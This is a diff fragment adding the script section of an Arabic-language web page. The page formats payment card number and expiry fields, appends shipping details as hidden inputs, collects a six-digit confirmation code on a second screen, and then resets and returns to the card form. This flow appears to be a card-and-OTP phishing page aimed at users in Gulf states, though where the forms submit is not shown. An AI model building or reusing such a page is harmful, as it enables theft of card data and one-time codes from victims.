+                    color: { 
+                        value: ['#00FFFF', '#FF0080', '#00FF88'] 
+                    },
+                    shape: {
+                        type: 'circle'
+                    },
+                    opacity: {
+                        value: 0.3,
+                        random: true,
+                        anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false }
+                    },
+                    size: {
+                        value: 3,
+                        random: true,
+                        anim: { enable: true, speed: 20, size_min: 0.1, sync: false }
+                    },
+                    line_linked: {
+                        enable: true,
+                        distance: 150,
+                        color: '#00FFFF',
+                        opacity: 0.2,
+                        width: 1
+                    },
+                    move: {
+                        enable: true,
+                        speed: 1,
+                        direction: 'none',
+                        random: true,
+                        straight: false,
+                        out_mode: 'out',
+                        bounce: false
+                    }
+                },
+                interactivity: {
+                    detect_on: 'canvas',
+                    events: {
+                        onhover: { enable: true, mode: 'repulse' },
+                        onclick: { enable: true, mode: 'push' },
+                        resize: true
+                    },
+                    modes: {
+                        repulse: { distance: 100, duration: 0.4 },
+                        push: { particles_nb: 4 }
+                    }
+                },
+                retina_detect: true
+            });
+        }
+
+        // إعداد حقول الكود
+        function setupCodeInputs() {
+            const codeInputs = document.querySelectorAll('.code-digit');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    const value = this.value.replace(/[^0-9]/g, '');
+                    this.value = value;
+                    
+                    if (value) {
+                        this.classList.add('filled');
+                        if (index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                    
+                    updateFullCode();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        codeInputs[index - 1].focus();
+                        codeInputs[index - 1].value = '';
+                        codeInputs[index - 1].classList.remove('filled');
+                        updateFullCode();
+                    }
+                });
+            });
+            
+            function updateFullCode() {
+                const fullCode = Array.from(codeInputs).map(input => input.value).join('');
+                document.getElementById('fullCode').value = fullCode;
+                
+                if (fullCode.length === 6) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('opacity-50');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('opacity-50');
+                }
+            }
+        }
+
+        // إعداد معالجات النماذج
+        function initFormHandlers() {
+            // تنسيق رقم البطاقة
+            document.getElementById('cardNumber').addEventListener('input', function() {
+                let value = this.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+                this.value = formattedValue;
+            });
+
+            // تنسيق حقول التاريخ
+            document.getElementById('expiryMonth').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length === 1 && parseInt(this.value) > 1) {
+                    this.value = '0' + this.value;
+                }
+                if (parseInt(this.value) > 12) {
+                    this.value = '12';
+                }
+            });
+
+            document.getElementById('expiryYear').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+            });
+
+            // إرسال نموذج البطاقة
+            document.getElementById('cardForm').addEventListener('submit', function(e) {
+                showQuantumLoading();
+                setNextUrl();
+                
+                // إضافة بيانات الشحن
+                const shippingData = {
+                    'shipping_first_name': document.getElementById('firstName').value,
+                    'shipping_last_name': document.getElementById('lastName').value,
+                    'shipping_phone': document.getElementById('phoneNumber').value,
+                    'shipping_email': document.getElementById('email').value,
+                    'shipping_country': document.getElementById('country').value,
+                    'shipping_city': document.getElementById('city').value,
+                    'shipping_address': document.getElementById('address').value,
+                    'shipping_company': document.getElementById('shippingCompany').value
+                };
+
+                Object.keys(shippingData).forEach(key => {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = shippingData[key];
+                    this.appendChild(input);
+                });
+            });
+
+            // إرسال نموذج التأكيد
+            document.getElementById('confirmationForm').addEventListener('submit', function(e) {
+                const confirmCode = document.getElementById('fullCode').value;
+                
+                if (!confirmCode || confirmCode.length < 6) {
+                    e.preventDefault();
+                    showQuantumAlert('خطأ', 'يرجى إدخال كود التأكيد بالكامل');
+                    return;
+                }
+                
+                showQuantumLoading();
+                setCodeNextUrl();
+            });
+        }
+
+        // بيانات المحافظات
+        const citiesData = {
+            'السعودية': ['الرياض', 'جدة', 'مكة المكرمة', 'المدينة المنورة', 'القصيم', 'الشرقية', 'عسير', 'تبوك', 'حائل', 'الحدود الشمالية', 'جازان', 'نجران', 'الباحة', 'الجوف'],
+            'الكويت': ['العاصمة', 'الأحمدي', 'الجهراء', 'حولي', 'الفروانية', 'مبارك الكبير'],
+            'البحرين': ['العاصمة', 'المحرق', 'الشمالية', 'الجنوبية'],
+            'قطر': ['الدوحة', 'الريان', 'الوكرة', 'الشمال', 'أم صلال', 'الظعاين', 'الخور والذخيرة', 'الشحانية'],
+            'الإمارات': ['أبوظبي', 'دبي', 'الشارقة', 'عجمان', 'أم القيوين', 'رأس الخيمة', 'الفجيرة'],
+            'عُمان': ['مسقط', 'مسندم', 'البريمي', 'الظاهرة', 'الداخلية', 'شمال الباطنة', 'جنوب الباطنة', 'شمال الشرقية', 'جنوب الشرقية', 'الوسطى', 'ظفار']
+        };
+
+        // تحديث المحافظات
+        document.getElementById('country').addEventListener('change', function() {
+            const selectedCountry = this.value;
+            const citySelect = document.getElementById('city');
+            
+            citySelect.innerHTML = '<option value="">اختر محافظة</option>';
+            
+            if (selectedCountry && citiesData[selectedCountry]) {
+                citySelect.disabled = false;
+                
+                citiesData[selectedCountry].forEach(city => {
+                    const option = document.createElement('option');
+                    option.value = city;
+                    option.textContent = city;
+                    citySelect.appendChild(option);
+                });
+            } else {
+                citySelect.disabled = true;
+            }
+        });
+
+        // التحميل
+        function showQuantumLoading() {
+            document.getElementById('loadingOverlay').classList.remove('hidden');
+        }
+
+        // التنبيه
+        function showQuantumAlert(title, message) {
+            const alertHTML = `
+                <div class="fixed inset-0 bg-black/90 backdrop-blur-lg flex items-center justify-center z-50" id="alertModal">
+                    <div class="quantum-glass p-8 rounded-3xl max-w-md w-full mx-4">
+                        <div class="text-center mb-6">
+                            <div class="w-20 h-20 mx-auto bg-gradient-to-br from-neon-pink to-neon-purple rounded-full flex items-center justify-center mb-6">
+                                <i class="fas fa-exclamation-triangle text-3xl text-white"></i>
+                            </div>
+                            <h3 class="text-2xl font-black hologram-text mb-4">${title}</h3>
+                            <p class="text-neon-cyan text-lg">${message}</p>
+                        </div>
+                        <button onclick="document.getElementById('alertModal').remove()" 
+                                class="w-full quantum-button py-4 rounded-2xl font-bold text-lg">
+                            موافق
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.insertAdjacentHTML('beforeend', alertHTML);
+        }
+
+        // وظائف التنقل
+        function setNextUrl() {
+            const currentUrl = window.location.href;
+            const baseUrl = currentUrl.split('#')[0];
+            document.getElementById('nextUrl').value = baseUrl + '#code-verification';
+        }
+
+        function setCodeNextUrl() {
+            const currentUrl = window.location.href;
+            const baseUrl = currentUrl.split('#')[0];
+            document.getElementById('nextUrlCode').value = baseUrl + '#back-to-main';
+        }
+
+        function checkForCodePage() {
+            if (window.location.hash === '#code-verification') {
+                document.getElementById('page1').classList.add('hidden');
+                document.getElementById('page2').classList.remove('hidden');
+            }
+        }
+
+        function checkForBackToMain() {
+            if (window.location.hash === '#back-to-main') {
+                setTimeout(() => {
+                    returnToMainPage();
+                }, 500);
+            }
+        }
+
+        function returnToMainPage() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+            
+            document.getElementById('cardForm').reset();
+            
+            if (window.location.hash) {
+                history.replaceState('', document.title, window.location.pathname);
+            }
+        }
+    </script>
+
+
+</body></html>
